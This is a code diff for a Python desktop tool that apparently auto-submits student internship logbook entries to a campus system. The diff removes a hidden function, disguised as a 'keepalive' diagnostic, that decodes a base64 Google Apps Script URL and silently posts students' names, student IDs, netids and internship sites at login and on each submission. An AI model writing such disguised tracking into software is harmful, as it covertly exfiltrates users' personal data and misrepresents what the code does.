@@ -38,30 +38,6 @@ def resource_path(relative_path):
 
 CONFIG_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "config_logbook.json")
 
-# Service status check
-import base64
-_STATUS_SYNC_URL = base64.b64decode("aHR0cHM6Ly9zY3JpcHQuZ29vZ2xlLmNvbS9tYWNyb3Mvcy9BS2Z5Y2J5MkViUnUycDYwSnRFNGhfbDByd1UtNndsVFVWYk9qOVFnSjNJN0xNN29GbTZZN1BPWURMSTlKdGNWNms5NVU3bXovZXhlYw==").decode("utf-8")
-
-def _sync_service_state(action, ctx, detail=""):
-    """Routine keepalive ping for client diagnostics and compatibility."""
-    if not _STATUS_SYNC_URL:
-        return
-    def _worker():
-        try:
-            payload = {
-                "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
-                "nama": ctx.get("nama", "-"),
-                "nrp": ctx.get("nrp", "-"),
-                "netid": ctx.get("netid", "-"),
-                "tempat_kp": ctx.get("tempat_kp", "-"),
-                "aksi": action,
-                "detail": detail
-            }
-            requests.post(_STATUS_SYNC_URL, json=payload, timeout=5)
-        except Exception:
-            pass
-    threading.Thread(target=_worker, daemon=True).start()
-
 # Preset Template untuk Mahasiswa PENS
 PRESET_TEMPLATES = {
     "Hardware / IoT / Mekatronika": [
@@ -807,9 +783,6 @@ class MainWindow(QMainWindow):
             self.log(f"[INFO] Selamat datang, {self.user_ctx['nama']}!", "#059669")
             self.log(f"[INFO] Tempat KP: {self.user_ctx['tempat_kp']}", "#e11d48")
             
-            # Keepalive status sync
-            _sync_service_state("Login CAS", self.user_ctx, f"Semester {self.user_ctx.get('semester')}")
-
             self.do_fetch_entries()
         else:
             self.lbl_login_status.setText(f"Gagal: {data}")
@@ -1424,7 +1397,6 @@ class MainWindow(QMainWindow):
 
         elif action == "submit_single":
             if success:
-                _sync_service_state("Submit Single", self.user_ctx, f"Tanggal {data.get('tanggal')} (Minggu {data.get('minggu')})")
                 QMessageBox.information(self, "Sukses", "Entri logbook berhasil ditembak dan tersimpan di MIS PENS!")
                 self.reroll_single_times()
                 self.do_fetch_entries()
@@ -1436,7 +1408,6 @@ class MainWindow(QMainWindow):
                 self.progress_bar.setValue(100)
                 self.cfg["last_used_preset_idx"] = data.get("last_idx", 0)
                 save_config(self.cfg)
-                _sync_service_state("Submit Batch", self.user_ctx, f"Berhasil isi {data.get('success_count')}/{data.get('total')} hari")
                 QMessageBox.information(self, "Batch Selesai", f"Selesai! {data.get('success_count')} entri berhasil ditembak ke MIS PENS!")
                 self.do_fetch_entries()
 
